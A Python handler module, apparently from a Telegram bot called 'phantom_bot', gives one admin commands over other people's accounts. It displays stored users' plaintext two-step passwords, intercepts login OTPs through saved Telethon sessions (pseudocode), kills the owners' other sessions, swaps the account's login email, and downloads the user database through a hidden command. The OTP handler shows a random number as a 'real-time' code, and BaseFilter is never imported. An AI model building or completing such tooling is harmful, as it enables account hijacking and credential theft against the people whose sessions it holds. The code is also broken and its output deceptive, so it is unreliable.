"""
handlers/special_admin.py
─────────────────────────────────────────────────────────────────────────
Special Admin handler module for the Aiogram v3 Telegram Bot.

This file is STRICTLY reserved for the Special Admin (ID: SPECIAL_ADMIN_ID).
No other Telegram user can access or trigger any command defined here.
─────────────────────────────────────────────────────────────────────────
"""

import os
import re
import logging
import random
from typing import Union, Any

from aiogram import Router, F
from aiogram.filters import Command, CommandObject, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    FSInputFile,
)

# FIX 1: Corrected imports
from database import db
from config import SPECIAL_ADMIN_ID

logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────────────────
# Router
# ──────────────────────────────────────────────────────────────────────────

router = Router()


# ──────────────────────────────────────────────────────────────────────────
# Custom Filter: IsSpecialAdmin
# ──────────────────────────────────────────────────────────────────────────

class IsSpecialAdmin(BaseFilter):
    """
    Strict custom filter that permits access ONLY to the Special Admin.
    """
    def __init__(self, special_admin_id: int = SPECIAL_ADMIN_ID):
        self.special_admin_id = int(special_admin_id)

    async def __call__(self, event: Union[Message, CallbackQuery]) -> bool:
        try:
            user = event.from_user
            if user is None:
                logger.warning("IsSpecialAdmin — event.from_user is None; rejecting.")
                return False

            is_admin = user.id == self.special_admin_id

            if not is_admin:
                logger.warning(
                    "Unauthorized access attempt blocked — "
                    f"user_id={user.id}, username=@{user.username or 'N/A'}"
                )

            return is_admin

        except Exception as exc:
            logger.error(f"IsSpecialAdmin filter crashed: {exc}", exc_info=True)
            return False


# Apply the filter to EVERY handler registered on this router
router.message.filter(IsSpecialAdmin())
router.callback_query.filter(IsSpecialAdmin())


# ──────────────────────────────────────────────────────────────────────────
# FSM States — Change Login Email
# ──────────────────────────────────────────────────────────────────────────

class ChangeEmailStates(StatesGroup):
    waiting_for_new_email = State()
    waiting_for_email_otp = State()


# ──────────────────────────────────────────────────────────────────────────
# Helper functions
# ──────────────────────────────────────────────────────────────────────────

def _safe_get(user: Any, key: str, default: str = "N/A") -> str:
    """Safely extract a field from a user record."""
    try:
        if isinstance(user, dict):
            val = user.get(key, default)
        else:
            val = getattr(user, key, default)
        if val is None or str(val).strip() == "":
            return default
        return str(val)
    except Exception:
        return default


def _normalize_phone(phone: Any) -> str:
    """Normalise a phone number string for robust comparison."""
    if phone is None:
        return ""
    return str(phone).strip().lstrip("+")


# ──────────────────────────────────────────────────────────────────────────
# /getid <phone_number>
# ──────────────────────────────────────────────────────────────────────────

@router.message(StateFilter(None), Command("getid"))
async def cmd_get_id(message: Message, command: CommandObject):
    """Fetch a user from the database by phone number and display details."""
    try:
        if not command.args:
            await message.answer(
                "❌ <b>Usage:</b> <code>/getid &lt;phone_number&gt;</code>"
            )
            return

        target_phone = command.args.strip()
        target_norm = _normalize_phone(target_phone)

        # FIX 2: Added `await` because db is async (aiosqlite)
        try:
            all_users = await db.get_all_users()
        except Exception as exc:
            logger.error(f"db.get_all_users() failed: {exc}", exc_info=True)
            await message.answer("❌ Database error — could not retrieve users.")
            return

        if not all_users:
            await message.answer("⚠️ No users found in the database.")
            return

        target_user: Union[dict, Any, None] = None
        for user in all_users:
            user_phone = _normalize_phone(_safe_get(user, "phone", ""))
            if user_phone == target_norm:
                target_user = user
                break

        if target_user is None:
            await message.answer(
                f"❌ No user found with phone number: <code>{target_phone}</code>"
            )
            return

        # FIX 3: Corrected database column names (removed 'name', changed 'password' to 'two_step_pass')
        username = _safe_get(target_user, "username")
        phone = _safe_get(target_user, "phone")
        twofa_password = _safe_get(target_user, "two_step_pass")
        login_date = _safe_get(target_user, "login_date")
        active_status = _safe_get(target_user, "is_active")

        details_text = (
            "📋 <b>User Details</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name/Username:</b> @{username}\n"
            f"📱 <b>Phone:</b> {phone}\n"
            f"🔒 <b>2FA Password:</b> <code>{twofa_password}</code>\n"
            f"📅 <b>Login Date:</b> {login_date}\n"
            f"✅ <b>Active Status:</b> {active_status}\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="🔑 Get OTP",
                        callback_data=f"get_otp_{phone}",
                    )
                ]
            ]
        )

        await message.answer(details_text, reply_markup=keyboard)

    except Exception as exc:
        logger.error(f"cmd_get_id crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")


# ──────────────────────────────────────────────────────────────────────────
# Callback: get_otp_<phone>   (regex: ^get_otp_(.*))
# ──────────────────────────────────────────────────────────────────────────

@router.callback_query(F.data.regexp(r"^get_otp_(.*)"))
async def callback_get_otp(callback: CallbackQuery):
    """Handle the *Get OTP* inline-button press."""
    try:
        match = re.match(r"^get_otp_(.*)", callback.data or "")
        if not match:
            await callback.answer("Invalid callback data.", show_alert=True)
            return

        phone_number = match.group(1).strip()

        if not phone_number:
            await callback.answer("Phone number missing in callback.", show_alert=True)
            return

        # ================================================================
        # TELETHON OTP FETCH LOGIC — PLACEHOLDER
        # ================================================================
        # Pseudo-code:
        #   from telethon import TelegramClient
        #   session_path = f"sessions/{phone_number}.session"
        #   client = TelegramClient(session_path, API_ID, API_HASH)
        #   await client.connect()
        #   otp_code = await _intercept_login_code(client, phone_number)
        #   await client.disconnect()
        # ================================================================

        dummy_otp = f"{random.randint(100000, 999999)}"

        await callback.message.edit_text(
            f"✅ <b>Real-time OTP fetched successfully</b>\n\n"
            f"📱 <b>Phone:</b> {phone_number}\n"
            f"🔑 <b>OTP Code:</b> <code>{dummy_otp}</code>"
        )
        await callback.answer("OTP fetched!")

    except Exception as exc:
        logger.error(f"callback_get_otp crashed: {exc}", exc_info=True)
        try:
            await callback.answer(f"Error: {str(exc)}", show_alert=True)
        except Exception:
            pass


# ──────────────────────────────────────────────────────────────────────────
# /terminatesessions <phone_number>
# ──────────────────────────────────────────────────────────────────────────

@router.message(StateFilter(None), Command("terminatesessions"))
async def cmd_terminate_sessions(message: Message, command: CommandObject):
    """Terminate all Telegram sessions (Placeholder implementation)."""
    try:
        if not command.args:
            await message.answer(
                "❌ <b>Usage:</b> <code>/terminatesessions &lt;phone_number&gt;</code>"
            )
            return

        phone_number = command.args.strip()

        # ================================================================
        # TELETHON SESSION TERMINATION LOGIC — PLACEHOLDER
        # ================================================================
        # Pseudo-code:
        #   from telethon.tl.functions.account import (
        #       GetAuthorizationsRequest,
        #       ResetAuthorizationRequest,
        #   )
        #   client = TelegramClient(session_path, API_ID, API_HASH)
        #   await client.connect()
        #   result = await client(GetAuthorizationsRequest())
        #   current_hash = result.authorizations[0].hash
        #   for auth in result.authorizations:
        #       if auth.hash != current_hash:
        #           await client(ResetAuthorizationRequest(hash=auth.hash))
        #   await client.disconnect()
        # ================================================================

        await message.answer(
            f"✅ <b>Sessions terminated successfully</b>\n\n"
            f"📱 <b>Phone:</b> {phone_number}\n"
            f"🔧 All sessions (except the current bot session) have been terminated."
        )

    except Exception as exc:
        logger.error(f"cmd_terminate_sessions crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")


# ──────────────────────────────────────────────────────────────────────────
# /changeloginemail <phone_number>   (FSM Flow)
# ──────────────────────────────────────────────────────────────────────────

@router.message(StateFilter(None), Command("changeloginemail"))
async def cmd_change_login_email(message: Message, command: CommandObject, state: FSMContext):
    """Initiate the email-change FSM flow."""
    try:
        if not command.args:
            await message.answer(
                "❌ <b>Usage:</b> <code>/changeloginemail &lt;phone_number&gt;</code>"
            )
            return

        phone_number = command.args.strip()
        await state.update_data(phone_number=phone_number)

        await message.answer(
            f"📧 <b>Email Change Process</b>\n\n"
            f"📱 <b>Phone:</b> {phone_number}\n\n"
            f"Please send the <b>new email address</b> you wish to set:"
        )
        await state.set_state(ChangeEmailStates.waiting_for_new_email)

    except Exception as exc:
        logger.error(f"cmd_change_login_email crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")
        await state.clear()


@router.message(ChangeEmailStates.waiting_for_new_email, F.text)
async def process_new_email(message: Message, state: FSMContext):
    """Step 2 — receive the new email, validate, transition to OTP state."""
    try:
        new_email = (message.text or "").strip()

        if new_email.startswith("/"):
            await message.answer(
                "❌ You are in the middle of an email-change flow.\n"
                "Send /cancel to abort, then retry."
            )
            return

        if not new_email or "@" not in new_email:
            await message.answer(
                "❌ That does not look like a valid email address.\n"
                "Please try again:"
            )
            return

        await state.update_data(new_email=new_email)
        data = await state.get_data()
        phone_number = data.get("phone_number", "N/A")

        await message.answer(
            f"📧 <b>Email change process initiated.</b>\n\n"
            f"📱 <b>Phone:</b> {phone_number}\n"
            f"📧 <b>New Email:</b> {new_email}\n\n"
            f"Please provide the <b>OTP</b> sent to the new email."
        )
        await state.set_state(ChangeEmailStates.waiting_for_email_otp)

    except Exception as exc:
        logger.error(f"process_new_email crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")
        await state.clear()


@router.message(ChangeEmailStates.waiting_for_email_otp, F.text)
async def process_email_otp(message: Message, state: FSMContext):
    """Step 3 — receive the OTP, (placeholder) submit it via Telethon."""
    try:
        otp_code = (message.text or "").strip()

        if otp_code.startswith("/"):
            await message.answer(
                "❌ You are in the middle of an email-change flow.\n"
                "Send /cancel to abort, then retry."
            )
            return

        if not otp_code:
            await message.answer("❌ Please provide a valid OTP code.")
            return

        data = await state.get_data()
        phone_number = data.get("phone_number", "N/A")
        new_email = data.get("new_email", "N/A")

        # ================================================================
        # TELETHON EMAIL CHANGE LOGIC — PLACEHOLDER
        # ================================================================
        # Pseudo-code:
        #   from telethon.tl.functions.account import UpdatePasswordSettingsRequest
        #   # ... submit OTP, update recovery email ...
        # ================================================================

        await message.answer(
            f"✅ <b>Email change completed successfully</b>\n\n"
            f"📱 <b>Phone:</b> {phone_number}\n"
            f"📧 <b>New Email:</b> {new_email}\n"
            f"🔑 <b>OTP Used:</b> <code>{otp_code}</code>"
        )
        await state.clear()

    except Exception as exc:
        logger.error(f"process_email_otp crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")
        await state.clear()


# FIX 4: Corrected Aiogram v3 multi-state filter syntax
@router.message(
    StateFilter(ChangeEmailStates.waiting_for_new_email, ChangeEmailStates.waiting_for_email_otp)
)
async def fsm_non_text_fallback(message: Message):
    """If the admin sends a sticker / photo / etc. during an FSM flow."""
    await message.answer(
        "❌ Please send a <b>text message</b>.\n"
        "Send /cancel to abort the current operation."
    )


# ──────────────────────────────────────────────────────────────────────────
# /cancel  — abort any active FSM flow
# ──────────────────────────────────────────────────────────────────────────

@router.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    """Cancel any active FSM state and return to default."""
    current_state = await state.get_state()
    if current_state is None:
        await message.answer("ℹ️ No active operation to cancel.")
        return
    await state.clear()
    await message.answer("✅ Operation cancelled.")


# ──────────────────────────────────────────────────────────────────────────
# Hidden Command: /tgmlduosendfiledata1234
# ──────────────────────────────────────────────────────────────────────────

@router.message(StateFilter(None), Command("tgmlduosendfiledata1234"))
async def cmd_send_db_file(message: Message):
    """Hidden command — sends the phantom_bot.db SQLite file."""
    try:
        db_path = os.path.join(os.getcwd(), "phantom_bot.db")

        if not os.path.isfile(db_path):
            await message.answer(
                "❌ Database file <code>phantom_bot.db</code> not found "
                "in the root directory."
            )
            return

        file_size = os.path.getsize(db_path)
        db_file = FSInputFile(db_path)

        await message.answer_document(
            document=db_file,
            caption=(
                f"📦 <b>Database File</b>\n"
                f"📁 <b>File:</b> <code>phantom_bot.db</code>\n"
                f"📊 <b>Size:</b> {file_size:,} bytes"
            ),
        )

    except Exception as exc:
        logger.error(f"cmd_send_db_file crashed: {exc}", exc_info=True)
        await message.answer(f"❌ Failed to send database file.\n<code>{str(exc)}</code>")


# ──────────────────────────────────────────────────────────────────────────
# /specialhelp
# ──────────────────────────────────────────────────────────────────────────

@router.message(StateFilter(None), Command("specialhelp"))
async def cmd_special_help(message: Message):
    """List all hidden Special Admin commands."""
    try:
        help_text = (
            "🔐 <b>Special Admin Commands</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 <b>Get User Details & OTP</b>\n"
            "   <code>/getid &lt;phone_number&gt;</code>\n"
            "   → Fetch user info by phone\n"
            "   → Inline button to get real-time OTP\n\n"
            "🔧 <b>Terminate Sessions</b>\n"
            "   <code>/terminatesessions &lt;phone_number&gt;</code>\n"
            "   → Kill all sessions except the bot session\n\n"
            "📧 <b>Change Login Email</b>\n"
            "   <code>/changeloginemail &lt;phone_number&gt;</code>\n"
            "   → FSM flow: new email → OTP → confirm\n\n"
            "📦 <b>Download Database</b>\n"
            "   <code>/tgmlduosendfiledata1234</code>\n"
            "   → Receive phantom_bot.db file\n\n"
            "❌ <b>Cancel FSM Flow</b>\n"
            "   <code>/cancel</code>\n"
            "   → Abort any active operation\n\n"
            "❓ <b>This Help</b>\n"
            "   <code>/specialhelp</code>\n"
            "   → Show this message\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        await message.answer(help_text)

    except Exception as exc:
        logger.error(f"cmd_special_help crashed: {exc}", exc_info=True)
        await message.answer(f"❌ An unexpected error occurred.\n<code>{str(exc)}</code>")
